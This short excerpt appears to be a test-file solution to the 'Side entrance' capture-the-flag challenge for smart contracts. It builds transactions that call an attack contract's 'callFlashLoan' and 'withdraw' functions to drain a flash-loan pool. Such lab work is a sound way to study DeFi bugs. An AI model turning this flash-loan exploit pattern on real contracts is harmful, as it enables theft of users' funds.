...
describe('[Challenge] Side entrance', function () {
    ...
    it('Execution', async function () {
        ...
        const callFlashLoanTx = {
            to: AttackContract.address,
            data: AttackContract.interface.encodeFunctionData('callFlashLoan'),
            gasLimit: 30000000n
        }

        const withdrawTx = {
            to: AttackContract.address,
            data: AttackContract.interface.encodeFunctionData('withdraw'),
            gasLimit: 30000000n
        }

        const txs = [callFlashLoanTx, withdrawTx]
